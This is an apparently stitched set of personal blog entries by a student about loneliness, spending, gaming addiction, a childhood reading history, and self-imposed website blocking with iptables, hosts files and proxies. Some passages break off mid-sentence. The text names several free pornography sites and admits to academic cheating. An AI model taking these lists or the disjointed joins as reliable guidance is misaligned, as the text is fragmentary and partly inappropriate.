vulnerable.</li>\n<li>I called my parents by excusing to go to bathroom, then my parents\ntold me he was fraud, and I deleted him. In the end nothing was stolen,\nonly I wasted a whole night.</li>\n</ol>\n<p>Some things to take in mind:</p>\n<ol type=\"1\">\n<li>Never admit to anything I didn\u2019t do. Be firm and learn to fight back\nmentally. Everyone knows I am innocent. Learn to fight the authority,\nthis is critical for freedom. (even to policeman, don\u2019t treat them like\nshit).(never ever ever get involved to drug cartels or prostitutes or\nchild porn or politics in real life, if I got involved then these crimes\nmight actually be a reality, although for such news, I am still very\ncurious into what exactly happened. The worst things I can do is\nprobably throwing trash on the ground or improper citations or\njaywalking)</li>\n<li>Stay to principles and don\u2019t download unnecessary softwares for\nother people. If necessary go use it on other machines. This is hardest,\nbecause, at my age such things are extremely stimulating to the\nmind.</li>\n<li>Never believe officials \u201ccalling\u201d</li>\n<li>No one is prune to frauds! Always act with some caution(not\nnecessarily so much but still don\u2019t act arrogant), and many frauds can\u2019t\nget to me</li>\n</ol>\n<p>Some thoughts about policeman:</p>\n<ol type=\"1\">\n<li>I never had one encouter with policeman in my life besides going to\npolice station for id cards or something.</li>\n<li>Policeman are not authority, especially individual ones.</li>\n<li>Try complying if encoutered, but at least be mentally strong</li>\n<li>Policeman catch bad people. If I commit a serioud crimme I will\nprobably be bought to justice, but in certain situations certain people\ncommit certain crimes, which police chooses to ignore(although everybody\nknows)</li>\n</ol>\n<p>That said, there are countless illegal acts in both China and\nAmerica. Sensible police obviously browse the Internet and knows, but\nthey don\u2019t catch the criminals, even if they know who they are.</p>\n<p>This is probably because:</p>\n<ol type=\"1\">\n<li>criminals are cunning, justifying their acts in ridiculous ways</li>\n<li>criminals might have <strong>certain</strong> relationship to\npolice</li>\n<li>police <strong>just</strong> doesn\u2019t catch these kind of crimes, (it\nis usually an action not encouraged and not that bad, although illegal,\nand police will try to handle those cases if they are explicitly\nreported or affecting a very large scale, but on individual cases police\ndoesn\u2019t care)</li>\n</ol>\n<p>There are other reasons I don\u2019t know. In conclusion as a sane citizen\nit is best for me to get away from politics, Winnie, drug cartels,\nprostitution, policeman, etc.</p>\n<h3 id=\"buying-gifts-or-sending-money-to-strangers\">Buying Gifts or\nSending Money to strangers</h3>\n<p>I nor want to receive money or expensive gifts nor have the ability\nto send money or expensive gifts right now.</p>\n<p>As you can see currently I am using my parents money, so beyond the\nbasic living I have literally no money at all, which means anyone with\nmoney left in their purse is richer than me. In the futuer I plan to\nalways buy phones less than 200 dollars(maybe with inflation go higher).\nIphone is not attractive in any ways. It turns out the most luxurious\nthing I have is my laptop.</p>\n<p>Say I change laptop every 2 years, that probably adds around 50-100\ndollar to my monthly budget.</p>\n<p>Other things I either inherit it from parents (which I will probably\nstop after a few years), or are very cheap, typically below 50 dollars.\nThere is nothing as expensive as the laptop. The most expensive thing is\nabout 1/20 the price of a pricey laptop(cheap laptops like chromebooks\nor ARM computers might be 300 dollars, but they aint optimal for daily\ndriver). I can probably buy a 400-500 dollar computer if budget comes\ntight, which equates to 20 dollars a month if used 2 years, cheaper than\na normal lunch in San Francisco.</p>\n<p>Just as you can see, right now I am in the state of being\n<strong>feed</strong> by my parents, which means my parents can\ndetermine how much money I have. My parents are <strong>usually</strong>\ngenerous, but it doesn\u2019t mean they will forever give money to me. After\nuniversity I plan to not take any more from them. Literally this means\nall money I spent needs to be consented by my parents, what\u2019s more,\npretty much everything I do would be consented by my parents. Although\nmy parents are also generous about my decisions and giving pretty much\nfull consent with default settings, I am still not free, kind of like I\nam not \u201csudo\u201d user in my computer.</p>\n<p>Of course I need more money than a mere 500 dollars each month if I\nam to feed a family. It is better to have some emergency money in my\nhands. Also a child is far far more costly, and normally people have\nchildren at age 30(I don\u2019t know if I will though, or ever), also at\naround age 30 my parents go into 60s, meaning they probably will spend\nsome money for health reasons.</p>\n<p>It is obvious to save some budget, though I don\u2019t know how much is\nsuitable. You can\u2019t save all money and not spend them, which is\nridiculous. But it is highly unlikely I will have some money right now,\nand spending those few thousands of dollars(if I ever can earn) for a\nsmall-scale traveling seems pretty suitable.</p>\n<p>But for right now at least, I am using my parents money, which makes\nsense not to send any money to anyone. I mean llike 10 or 20 RMB\nsometimes can be lost by accident occasionally, like if the metro stops\nfor a day and using the taxi costs more than that. But only\noccasionally, and over 1000 RMB should be cautious when treating.</p>\n<h3 id=\"motivation\">Motivation?</h3>\n<p>What drives me forward? What makes my life meaningful?? Obviously not\nstudying some crappy subject in school, right? But aren\u2019t I dependent on\nthe diplomas? I am not free in this sense, where I depend on some shit\nto get my diploma, and had to study and work like a shit. However, I am\nstill geniuely grateful for USTC, because, among the trashpile, you are\nthe less annoying one. At least USTC helped me realize many things that\notherwise I couldn\u2019t think of, and, in that sense, is some liberty,</p>\n<p>Sorry for the selffishness but beyonds enhancing my life and gaining\nsome sort of control over it there is no other purpose of life that I\ncould think of. Some great people live in poor standards for many years,\nand it\u2019s probably not gonna happen for me. If I am going to live in\nthose poor conditions, I would rather try to go in a better situation\nthan being literally stuck. There isn\u2019t any meanings in your life if you\ndie, and meanings diminish if your wellbeing diminishes. I am not\ndreaming of a person who have billions of dollars but needs to be in bed\nfor covid every single day, till his death. There is no point in being\npoor in the first place.</p>\n<p>I think I am out of poverty right now, although being arrogant is\nagainst my philosophy. Anyways, I can probably freelance for 1 or 2 days\na week and be self-sustained in lower ends towns and cities. I wouldn\u2019t\ngive up the basic living conditions or my health for selflessness, for\nresearch, or for just anything, or anyone.</p>\n<h3 id=\"so-it-seems-like-loneliness-was-a-problem-after-all\">So it seems\nlike loneliness was a problem after all?</h3>\n<p>Playing proprietary games, looking at unnecessary proprietary trash\nsocial media, watching adult videos, all of these, are these\nunavoidable?</p>\n<p>I thought loneliness could be handled without complaints but after\nall, it seems like a serious mental problems, seemingly with no ways to\ncope against.</p>\n<p>Loneliness leads to idealizing the society, and people around me.</p>\n<p>But socializing seems so complicated and hard to implement, all at\nthe same time? How did I not find some close friends through all those\ndifficult years? Or, is it because I lost trust in seemingly everything,\nthat I decided to, take a turn back towards the nighttime?</p>\n<h2 id=\"updates-february\">Updates February</h2>\n<h3 id=\"melancholy-night\">Melancholy Night</h3>\n<p>This melancholy night reminds me again of the numerous occasions of\nbeginning of semester scenario throughout my middle school career, and\nyet, even over the years, still lost and helpless am I.</p>\n<p>It is a common practice to feel a little nostalgic, whilst when\nasked, do I want to return to the past? I would probably refuse.</p>\n<p>Back to the days where I would play video games for hours in the\nsummer, then go to the library to try hard studying, making my own\ngoals, trying to accomplish, afraid of schools yet it\u2019s always coming,\ngoing. Back to the days where in the final exam I would be so anxious\nand play video games the whole day before the afternoon exam at home,\nand fear the hear my scores. I would walk and dream of the world as\nmine, and with the lighest and purest heart, appreciate the beauty of\nthe night-lights in the urban areas of Shanghai.</p>\n<p>I would make a comprehensive studying plan, only breaking down half\nway usually to go off playing video games. I would try to push myself\nforward, and read lots of literature, pretending they are of great\nknowledge. I would hope for the school to end, and dream of the future\nafter middle school.</p>\n<p>I would go crying and exclaiming about the whole world around me,\nhowling into the uttermost darkness, or the brighest summertime with\nsizzling sun, or just a mediocre spring day. I would ill at the\nloneliness, and long for a companion, yet seeing none my age. I would\ntreat the external world the way I saw it around me, and naught the\ndistractions on the Internet nor what\u2019s happening in the world would\ncause the slightest hint of thought. I had no idea, and so there is no\nbother.</p>\n<p>I lived the life of school day after day, as if it was of some\nimportance and greatness. I was strict about the goods and bads, and I\nwould start tackling those matters one by one. It was hard, yes, the\nuneasiness of puberty, the urge of sex, the sensitivity of the fragile\nmind. Yet, hard as it might, and ultimately, I would try shaping myself\ninto the person I wanted, trying to strictly define the thing, and hope\nall the light in the future.</p>\n<p>So I hoped, and I dreamed, and everything was shattered.</p>\n<p>It wasn\u2019t until recently did I realize I lived in some kind of\nmockery nearly all my life, and naught did I know my purpose back then.\nI lived for other people, and it goes against my mind. My efforts\nweren\u2019t for my own purposes\u2013they were forced. And thus, did this system\ncrumble, and breaked were my mental mind and philosophy. This system\nsimply leads nowhere, and nor did I know what to strive for. Ending in a\ndifficult situation am I right now, and completely dazzled and\nfrustrated, losting his way in the path going to nowhere.</p>\n<h3 id=\"external-brainwash-vs-internal-control\">External Brainwash vs\nInternal Control</h3>\n<p>Internal Control is an inevitable method to gain control of myself\nover the external environment, while also restricting the mind.

I wanted to get out, but couldn\u2019t, and thought\nthat was the dorm I must facce in my high school.</p>\n<p>There was the final exam, and I prepared really hard and thought I\nhad tried my best for it. However, there was going to be an annoucement\nof Chemistry scores, and the same dreaded and creepy feeling came all\nover me again that it was gonna be really horrible.</p>\n<p>Then I thought for the millionth time which subjects do I choose.\nPrecisely at that point I even lost account of the fact that I finished\nhigh school. I thought I\u2019d choose physics and geology for sure, as 3\nsubjects were required, but then I needed to choose another among the\nChemistry, Biology, History, and Politics, and I got super nervous and\nanxious.</p>\n<p>I thought back to choosing History for a moment before realizing how\nawful I performed on the subject, but there wasn\u2019t much other choices,\nsince my Chemistry and Biology are much worse.</p>\n<p>Then I sort of faded back into unconsciousness, and woke up.</p>\n<h3 id=\"why-browser-extension-redirects-doesnt-work\">Why browser\nextension redirects doesn\u2019t work?</h3>\n<p>You either go on or you don\u2019t go on these websites.

Ineffective with VPN.</p></li>\n<li><p>Changing /etc/hosts file, very inefficient indeed, makes computer\nruns slowly when records go high(millions) since it goes through linear\nsearch. Ineffective when using a VPN.</p></li>\n<li><p>Using a squid proxy to route the traffic on another port, and\nconfig it globally.</p></li>\n</ol>\n<p>Squid is primarily used for caching and improving web performances,\nturning out it does improve performance on my computer, although not by\nmuch, only about less than 20%(probably because I am also behind\nClashVerge vpn).</p>\n<p>Anyways, squid can be configed to block websites using external tools\nlike squidguard or e2guardian. But still on the original port the\ntraffic is not blocked.</p>\n<ol start=\"4\" type=\"1\">\n<li>Using a VPN in the first place might block some websites, but these\nare usually blocked anyways in China. The point of VPN is usually\nbrowsing Internet freely, not for more restrictions.</li>\n</ol>\n<p>Cloudflare Warp family works to block inappropriate websites, but\nit\u2019s too slow in China, since I needed to first connect to a US\nserver.</p>\n<ol start=\"5\" type=\"1\">\n<li><p>Using filter rules in ClashVerge vpn (or shadowsocks) blocks\nwebsite. For example, if you block twitter then twitter will be\ninaccessible through the vpn, it is also inaccessible in Mainland China,\nso the site is blocked through the vpn. However, by simply changing a\nvpn provider one can still bypass.</p></li>\n<li><p>Trying browser extensions. Most ineffective way ever. One can\neasily bypass by installing another browser. Some browser, like\nqutebrowser, doesn\u2019t support extensions.</p></li>\n<li><p>Trying some parental control software. Extremely bad way.\nFirstly, those softwares are often complicated to set up, often with\nmuch configuration and \u201cgui\u201d, which is probabaly the last thing I will\ntry. Furthermore, these softwares complicates the monitoring and\ncensoring, making I feel very uncomfortable, against the point of trying\nto achieve freedom and comfort through filtering evil websites.\nMoreover, they eat up system cpu usage and network speed. Lastly, most\nare ineffective, and may be bypassed by VPN easily.</p></li>\n<li><p>Be \u201cbelow 18 years old\u201d on Internet. This isn\u2019t a method in the\nfirst place since although Google search won\u2019t return malicious results\nfor children, most malicious(adult) websites doesn\u2019t need confirming to\nenter.</p></li>\n<li><p>Try dropping the iptables.</p></li>\n</ol>\n<pre class=\"sh\"><code>[user ~]$ sudo iptables -I OUTPUT 1 -d 104.21.68.184 -j DROP\n[user ~]$ sudo iptables -I OUTPUT 1 -d 172.67.197.209 -j DROP</code></pre>\n<p>Ineffective over VPN.</p>\n<p>In conclusion it is quite hard to block harmful websites without\nextensive and a very long time configuration and extensive testing,\nwhich is far less time-efficient than normal things to do. Anyways, the\nmain goal is the block inappropriate content, and if browsing\ninappropriate content is my own will, then I must be responsible for it.\nThere are millions of inappropriate websites in minimum, with more going\nout everyday. It is almost impossible without a \u201cGUI\u201d or extensive\nmonitoring software for offering such a service effectively.</p>\n<h3 id=\"what-i-shall-focus-preventing-on-right-now\">What I shall focus\npreventing on right now?</h3>\n<p>There are several pretty serious issues to be addressed.\nTypically</p>\n<ol type=\"1\">\n<li>Never ever play video games</li>\n<li>Never ever go on those cn spam platforms</li>\n</ol>\n<p>These ARE causing troubles for me right now, also so is my sleeping\nschedule, but anyways, sleepoing schedule can be adjusted, but these\nthings are such a pain.</p>\n<p>If I go on tieba for once I will be addicted with the shit.</p>\n<h3 id=\"some-previous-erros-in-my-website-development\">Some previous\nerros in my website development</h3>\n<p>I made some pretty ridiculous erros before, for example, I used 2\ndomains and 2 linode vps for frontend and backend. This can be utilized\nby using nginx proxy on one Linode machine and configuring a path for\nthe backend.</p>\n<p>I also constantly ran <code>sudo npm start</code> for my website,\nwhich is quite stupid. I shall run <code>npm run build</code> for\nproduction builds.</p>\n<h3 id=\"what-kind-of-woman-do-i-want-to-marry\">What kind of woman do I\nwant to marry?</h3>\n<p>Something about me; I aim for freedom and control. This is\nunnegotiable.</p>\n<p>I mean, for people who do not care about their freedom, it\u2019s\nabsolutely fine to be friends with them, but to have a spouse to live\nwith like 50 years, it is kind of deeply troublesome.</p>\n<p>When I see a girl I immediately release some kind of chemical that\nmakes me excited or what, then I started to think about like being\ntogether with this girl, and possibly marrying. But it is very\nridiculous thinking, anyways, even if she wants to marry me, will I\nagree?</p>\n<p>I do hope to find someone who is also independent and free-willed,\nand we can negotiate on other things. But seeing some pretty girls\ntaking, well that really made me not like them anymore.</p>\n<h3 id=\"money-spending\">Money Spending</h3>\n<p>I had become very converative at money spending.</p>\n<ul>\n<li><strong>Autocharging</strong></li>\n</ul>\n<p>Firstly, I just feel bad with \u201cautocharging\u201d. This feature derives me\nof control over my money. I am not someone with extremely good memories,\nso usually I tend to forget about it. Look, I know it is cheap and not a\nlot of money or something but it still makes me feel very bad. And\nlately a scam website called anphlp charged me 26 dollars, which I think\ncame from me signing up for streaming on a scam website with my\ncard.</p>\n<ul>\n<li><strong>Just Feeling Bad :(</strong></li>\n</ul>\n<p>Secondly, I just feel bad about people taking my money at all. I\nmean, like to be honest, Google and YouTube deserves to charge me some\nmoney since I am using so much searching and watching so much video,\nwithout spending a cent. Think about YouTube\u2019s spendings on its cdns.\nAnd Google\u2019s search is on its own platform, and performs in its own\ncloud, which makes more sense if they charge me.</p>\n<p>Anyways I just don\u2019t feel like spending any money on websites, they\ndon\u2019t give much shit, though. Websites are essentailly programs with a\nfrontend, pretty much anything I can run locally with Aur repos.</p>\n<p>I think Linode is ok to charge me five dollars for renting their\nstable cloud services, so is other cloud providers. But watching a video\nor movie is nonfree? Using some crap like veed? Oh come on, who wants to\nwatch it anyways?</p>\n<ul>\n<li><strong>Enough Free Alternatives</strong></li>\n</ul>\n<p>There are millions of free hosting websites that you can stream\nalmost anything or download it. Even porn videos are hosted everywhere.\nLike straplez videos are hosted on pornhoarder.tv and xfantazy. Other\nsites with lots of porn videos include like spankbang, noodlemagazine,\nvideosection, etc. By a click I can find almost everything I would want\nto watch.</p>\n<p>I saw on RuTube a channel like marked with 18+, which immediately got\nmy interest, things like European Brazzers. But I searched on Google and\nI could go on another site to watch these for free. And they are\nactually pretty boring, like those mediocre (not even high-quality) porn\nvideos poorly stacked together. Why would I take the time to freaking\nwatch those stupid porn channels.</p>\n<p>I do acknowledge there are some high-quality videos that needs\ncharging, but anyways, I do not watch videos for a living, and thus I\ndon\u2019t really care about the quality if there are similar alternatives.\nWatching a football match and watching a basketball match seems pretty\nmuch same to me anyways.</p>\n<ul>\n<li><strong>Parents\u2019 Money</strong></li>\n</ul>\n<p>Anyways, last and most significant factor is that I am spending my\nparents\u2019 money, which means I have to keep total track of everything.\nIt\u2019s not like my parents asked me to do so or something, although they\nobviously did. It\u2019s like just a custom that when like depending on other\npeople you need to keep track of your doings. Depending on my parents\u2019\nnow is the worst thing that can ever happen to me, but there isn\u2019t much\nmore ways to earn moeny myself anyways.</p>\n<h3 id=\"conclusion-on-saving-money\">Conclusion on Saving Money</h3>\n<p>Also saving money doesn\u2019t necessarily make me better or feel good,\nbut overspending money do make me feel really bad.

{"title": "My Journey in Reading", "date": "Mon Sep 10 2018 18:08:06", "type": "journal", "body": "<h2 id=\"my-experience-in-reading\">My Experience in Reading</h2>\n<p>Today is approximately three years since I first started to be\ninterested in reading. That was in fifth grade when my primary school\nheld a program called Readathon.</p>\n<p>I described my attitude toward reading in fourth-grade in an\nautobiography:</p>\n<p>\u201cI didn\u2019t like reading at all. I could only read books that only have\nfour lines on a page. My parents made me do it, and I thought it was\nboring.\u201d</p>\n<p>Here\u2019s the feeling inside me when I went to the library:</p>\n<p>\u201cSeeing so many books made me kind of scared and amazed; I was hoping\nto find a good book when I spotted Junie B. Jones Aloha-ha-ha on a\nshelf. I got interested in the title of this book, so I borrowed it and\nstarted to read it.</p>\n<p>When I started reading, I found out that this book is so funny. There\nwere almost twenty lines on a page. I was so surprised and proud that I\ncould read forty-five pages in one day, five times than before.\u201d</p>\n<p>Reading is not a thing to be forced. One must be interested in\nreading in order to learn. For example, when my mother forced me to read\nin fourth grade, I didn\u2019t like reading at all. However, when I was\ninterested myself, I read so much that I couldn\u2019t believe it myself.</p>\n<p>**Note of author re-reading this material at 2023 in university, I\npractically hate everything that is assigned to me, even till now.\nHowever, I find a strange passion in certain things I came across, like\nLinux and frontend development</p>\n<p>But how to be interested in reading? Don\u2019t start with 300\nhundred-page novels or classics with words all over the pages, start\nwith simple books that make you interested, and every time when you\nstart a new series, increase the level a little bit. After weeks,\nmonths, and years, you will certainly be surprised. I was in fifth grade\nwhen I read Junie B., a first-grade level book. I was even impressed\nthat I read a book with only fifteen lines, forty-five pages a day.\nFunny, isn\u2019t it? However, I read the Narnia series less than a year\nafter it, and the Harry Potter series after 18 months.</p>\n<p>Don\u2019t be too happy, of course. All of these achievements are based on\nthe genuine love of the book. Don\u2019t care about your speed, but how much\nyou can get, what you can learn, and what the author wants to tell us\nafter reading a book. Don\u2019t be ashamed that you aren\u2019t the best reader\nin class. Reading is a long-term activity.</p>\n<p>After reading one of Junie B.\u2019s books, I also borrowed A to Z\nmysteries, Magic Tree House, and Ready Freddy. I finished one book from\neach series. I was amused because of the fun it brought to me, the\nwonderful adventures in these books.</p>\n<p>As the saying goes: A reader lives a thousand lives before he dies.\nThe man who never reads lives only one. I believe it because, as a\nmatter of fact, I think I have already lived more than one life. Every\ntime I opened a book, I became the main character, and I laughed and\ncried with them. I live the lives of the character in the book.\nSometimes, I was so into one book that it was seconds after I closed the\nbook that I realized that I am in my house, not in one of those\nadventures.</p>\n<p>Junie B is a funny series about Junie B.\u2019s kindergarten and\nfirst-grade life. I laughed so much when reading it my stomach hurts. It\ndescribes life in a first grader\u2019s eyes vividly and its language amazed\nme. I still used some of them in my compositions.</p>\n<p>It is a really easy series for me now. Last year I went to a Barnes\n&amp; Noble bookstore in California when I found it. I read a book again\nin about 10 minutes. So don\u2019t be disappointed. You can improve much much\nfaster than you ever dreamed.</p>\n<p>That was the start of my reading career. The next series is Magic\nTree House. I think many people know this series so I am not going into\ndetails, just to talk about the series in my eyes.</p>\n<p>I am now going to tell you a thing more even more hilarious. I\ncouldn\u2019t understand what the first book is about when I first started to\nread it. It was not until I read it the second time that I began to\nunderstand. Then I was amused by the adventures of Jack and Annie, who\nsaved so many people from disasters and helped the great man to success.\nI began to understand the rest of the series after I finished the first\none.</p>\n<p>I read the whole Magic Tree House series, all 57 of them. It almost\nbecame a tradition for me to borrow a book from the school library\nbefore lunch, read through the lunch break, and read through the class\nbreak in the afternoon. I usually finish it before school ends and\ndevote my time at home doing homework, studying math, and doing\nexercises.</p>\n<p>After winter vacation, I didn\u2019t enjoy some other book series. They\nhave the same style and it was so boring reading them. However, I later\nfound some series as good as Junie B series.</p>\n<p>I read many mystery novels. A mystery involves a puzzle to be sold\n(usually a crime). The author introduces the crime and gives clues to\nthe readers. The clues give readers an impression of the crime.</p>\n<p>Mystery usually has a complicated process of analysis. It makes a\nbook fascinating to read when readers are trying to figure out the\ntruth. But also in this process of solving the crime, the author gave\nthe characters a detailed description, usually concerning their\nreactions and attitudes toward the crime. This often shows the\npersonalities of people and the meanings behind them.</p>\n<p>Now I\u2019ve read many books, from easy ones to thousand-page ones. I\nhave also read many young adult books, and fantasies. Reading is a\nprocess to be enjoyed by everyone, to remove the stress in everyday\nlife.</p>\n", "_id": "66689636547d3fe098118770"}

I do not like the\nmainstream games like Clash Royale or Honor of Kings which my classmates\nplay. Instead, here is a list of games I remember being addicted to\n(from time order)</p>\n<ul>\n<li><strong>plants vs zombies</strong> 2nd grade-4th grade</li>\n<li><strong>plants vs zombies 2</strong> 4th grade-7th grade, sophomore\nyear</li>\n<li><strong>plants vs zombies ol</strong> 3rd grade-8th grade</li>\n<li><strong>carrot fantasy</strong><br />\n3rd grade-7th grade</li>\n<li><strong>carrot fantasy 2 (and the variation in 4399)</strong> 3rd\ngrade-7th grade</li>\n<li><strong>generals.io</strong> 10th grade-freshman year</li>\n<li><strong>zombsroyale.io</strong> sophomore year-now</li>\n<li><strong>brawl stars, slither.io</strong> not too addicted</li>\n</ul>\n<h2 id=\"measures-i-have-taken-to-prevent-myself-from-gaming\">Measures I\nhave taken to prevent myself from gaming</h2>\n<p>I have taken multiple measures to prevent myself from gaming, with\nsome success and failure.</p>\n<ul>\n<li>Before 6th grade I didn't remember taking any measures myself.</li>\n<li>In 6th grade I was addicted to plants vs zombies ol, and in the\nsecond semester I told myself that every time I play I would write it on\na notebook. In the end I controlled it.</li>\n<li>In 7th grade first semester I was addicted to plants vs zombies 2\nand carrot fantasy, and I wanted to stop gaming. One day I played carrot\nfantasy 8 hours. Shortly after, I deleted carrot fantasy. Then I was\naddicted to plants vs zombies 2, after about a month, I deleted plants\nvs zombies 2. Then I downloaded plants vs zombies 2 and was very much\naddicted again, then I deleted plants vs zombies 2 a second time. Then I\nstarted playing plants vs zombies ol, and couldn't stop playing it.doing\nsomething in its backend</li>\n<li>In 8th grade I told myself I must stop gaming. In November I decided\ngaming is not meaningful. It was painful and in the second semester I\nremembered trying so hard. I tried to shift my attention to long walks\nand outdoor activities. In the second semester I played roughly once or\ntwice a week, or once two weeks. In the summer I played less afer\nshifting my attention completely to outdoor activities.</li>\n<li>In 9th grade I made an honest effort to stop gaming altogether. I\nplayed only once in September 13rd the first semester. In the second\nsemester covid came. I liked going outdoors so much at that time that\neven during covid I was out walking 2 hours every day. I played less\nthan 5 times the second semester, only before exams when I felt too much\npressure.</li>\n<li>In 10th grade first semester, I wasn't too much into gaming anymore.\nHowever, later that semester I suffered great disappointment, since I\ntried really hard studying(the hardest I ever tried so far as I could\nremember), but still got a really low score. As a result, I began to\nfeel depression and became easily irritated. In the second semester, I\nbegan to play generals.io sometimes, like about twice a week.</li>\n<li>In Freshman year first semester, all people in my dorm was so\naddicted to gaming, to the point I felt sick and hated the dorm. I hated\nschool very much but couldn't do anything since I live far from my\nparents. I played generals.io sometimes, like less than 1 hour a day. In\nthe C Programming course I coded generals.io single player in C language\nmyself. I couldn't do anything to stop it, but it wasn't that serious at\nthat time. I distinctly remember in Janurary 1st 2022 I was playing\ngenerals.io as the clock turned. In the second semester, however, I grew\nmore frustrated and hated the dorm even more, to the point where I\nsuffered great emotional distress. I tried to control gaming by writing\non my notebook before using computer, that \"this time I use computer\nonly for *** purpose, not for gaming\". I checked my computer time usage\nevery week. In the end I played for some time but it was under\ncontrol.</li>\n<li>In Sophomore year I decided to end it for all. However, everything\njust got worse. I wrote an essay myself on why gaming is bad, listing\nall pros and cons. However, it all got worse when I began playing\nzombsroyale.io. It all started when I accidentally came across the game\none afternoon and couldn't stop playing for 2 hours straight. In the\nfirst semester there was massive covid lockdowns, and I felt bored and\ndepressed being locked down, and couldn't control myself from playing\nzombsroyale anymore. In the second semester I got on the exchange\nprogram to UC Berkeley. Then things got even worse. In the US, I was\nvery lonely and unmotivated, and I completely lost control of playing\nzombsroyale. I played for more than 600 hours this year. I did try to\nstop playing, without any success. In October I stopped gaming for a\nweek straight, motivated to do work when the school was locked down,\ndestroying my motivation. In April I faced a challenging project, and\nstarted procrastinating, playing zombsroyale nearly all day long. I\nended up cheating in that project. In May I decided to end gaming, and\nsucceeded for a week. However, in June I was caught for the previous\ncheating, and I got very sad and fully embarrassed of myself, pulling\nmyself back into emotional distress I suffered for long. In early August\nI felt completely out of motivation and dropped one of the summer\nclasses, playing zombsroyale all day long for a week. Then I decided to\nstop gaming once and for all, but in the test I got really low scores,\nmaking me disappointed once again and lost motivation. Then in late\nAugust I tried to stop gaming by disabling zombsroyale /etc/hosts,\nrewriting the /etc/hosts every few seconds in systemctl service, and\ndropping the ip address of zombsroyale in iptables. However, the stress\nI faced with the coming semester was too huge, and I couldn't handle\neverything. As a result, I flushed the iptable, and manually changed\n/etc/hosts file and went back to gaming again.</li>\n</ul>\n<h2 id=\"why-cant-i-stop-gaming\">Why can't I stop gaming?</h2>\n<p>I did manage to stop gaming a few periods in my life successfully.\nHowever, every time I was pulled back into gaming by emotional distress\ncaused by real life problems. I was pulled back by dopamine release.</p>\n<h2 id=\"i-can-stop-gaming-after-traveling\">I can stop gaming after\ntraveling</h2>\n<p>Traveling diverts my attention, and in traveling I have succeeded in\nnot gaming. But when facing loads of work and studying, I would often go\nback to gaming all over again.</p>\n<h2 id=\"gaming-itself\">Gaming Itself</h2>\n<p>Although gaming has all the cons, reasons are needed on why gaming is\nbad.</p>\n<p>Some invalid reasons include</p>\n<ul>\n<li>The teacher forbids me from gaming.\n<ul>\n<li>Teachers are usually not very smart people in tech. For example,\n(most) teachers don't know how to code. (Most) Teachers don't know how\nto use linux. (Most) Teachers don't know computer networking. (Most)\nTeachers don't know html. (Most) Teachers don't know computer security.\nTrusting the teacher who has limited knowledge in tech and is arrogant\nis stupid.</li>\n</ul></li>\n<li>Parents forbid me from gaming. Same as above</li>\n<li>Gaming shifts your attention from studying.\n<ul>\n<li>Everything shifts my attention, including studying foreign\nlanguages, planning and taking long walks. Just because gaming shifts my\nattention doesn't mean I need to quit gaming</li>\n</ul></li>\n<li>People who game don't study well\n<ul>\n<li>People in top universities with top scores sometimes game a\nlot.</li>\n</ul></li>\n</ul>\n<p>Some valid reasons include</p>\n<ul>\n<li><strong>I gain nothing from gaming</strong> After running I run\nfaster, after studying I know more, after learning language I learn more\nabout culture. However, after gaming I get nothing.</li>\n<li><strong>Time consuming</strong> Gaming is addictive, and I usually\nspend more time than intended.</li>\n<li><strong>Mental Health Impacts</strong> Becoming too immersed in a\ngame can lead to heightened emotions and loss of control, exacerbating\nfeelings of distress or agitation.</li>\n<li><strong>Social Isolation</strong> While gaming can offer a virtual\ncommunity, it might also mean less time spent with family or friends in\nthe real world, leading to feelings of isolation or neglecting important\nrelationships.</li>\n</ul>\n<p>However, I must also acknowledge painfully that pros of gaming\nexists</p>\n<ul>\n<li>Gaming is exciting and life is boring</li>\n<li>Gaming is escape when facing stress</li>\n<li>Gaming includes online conversation, which I might want when feeling\nlonely</li>\n<li>Gaming moves may seem cool and accomplishing</li>\n</ul>\n<h2 id=\"whats-next\">The essay I wrote before</h2>\n<p>https://www.jimchen.me/blog/Thu%20Oct%2013%202022%2014:10:02</p>\n<p>Gaming is like a piece of shitty bloatware, except it grows inside\none\u2019s mind. It is very scary how evilly the thing affects one\u2019s\nwell-being.</p>\n<p>I am not saying all gaming is evil; in fact, there are plenty of very\ngood and interesting games that don\u2019t have notable disadvantages if\nplayed under a controlled environment. Examples of this include 2048 and\nchess. But as far as I am concerned, a large portion of the most popular\nones are very toxic.</p>\n<p>Openai Gym games are good and interesting to play!</p>\n<p>What a piece of shitty bloatware does to a computer is exactly what\ngaming does to one\u2019s mind. Bloatware, also known as\n<strong>crapware</strong>, typically refers to unnecessary software that\nAlso, open source stuff the average user might not need or want, and it\ncan negatively affect a computer\u2019s performance in several ways:</p>\n<ul>\n<li>Slows down the system</li>\n<li>Takes up disk space</li>\n<li>Increases security risks</li>\n<li>Complicates the user experience</li>\n<li>Drains battery life</li>\n</ul>\n<p>To sum it up, such things are mainly <strong>resource-hungry</strong>\nand <strong>out of control</strong>. They try to eat up your computer\nsystems without notable contributions themselves, and negatively impact\nthe useful stuff. Also, bloatware is usually out of a user\u2019s control. It\nmight be backdoors imposed by companies, or monitors that log and send\nyour personal data, or incompatible software forcing a user to use\neverything that company provides.</p>\n<p>Gaming does exactly the same to one\u2019s mind! It stimulates the mind to\nbe addicted to something useless, and in turn suppresses the mind from\nprocessing useful stuff. Also, gaming is usually out of one\u2019s control,\nand when someone is addicted, they practically cannot control themselves\nat all. Thinking about gaming on a minute basis is awfully easy when one\nis addicted\u2014it just eats up the mind.</p>\n<p>When talking about freedom, usually the first thing is about one\u2019s\nfreedom of mind\u2014it is as important as freedom in real life. If one\u2019s\nmind is out of control, a person is no different from living in a\nprison.</p>\n<h2 id=\"how-company-exploits-you\">How company exploits you</h2>\n<p>By first making you addicted to someone they have exclusivly, then\nsuddenly increasing the price, the company is exploiting the\nvulnerabilities of personality. The answer to that is never get addicted\nto something the company earns. In truth the company can raise the money\nto however high they want, (gradually), and force the user to keep\npaying to them to play a game(or a feature that only they have). You\nwill lose your life, honestly. If you get addicted it will strongly\nimpact your mind and behavior, forcing you to pay for unnecessary shits\nand neglect other aspects of your life.</p>\n<p>Imagine food price skyrocketed, will you still buy them? The answer\nis yes. For game addicts, gaming is like eating food, and not gaming is\nlike starving(or at least equally painful, or more painful than that).\nThe company then goes to provides \u201cfood\u201d for the gamer, which is\nessential to their daily supply.</p>\n<p>Such an act is not only unreasonable but very unethical, however, I\nsee no law enforcements addressing this. So it is very important to be\naware of the amount of control the company have on you.</p>\n<h2\nid=\"about-the-actual-proprietary-feature-of-gaming-and-lack-of-control\">About\nthe actual \u201cproprietary\u201d feature of gaming and lack of control</h2>\n<p>Gaming itself is usually designed to be hard to control since what is\nthe point of gaming if it is easily finished or achieved? Especially\nthose 3D gun games, like people are essentially competing against each\nother in a virtual 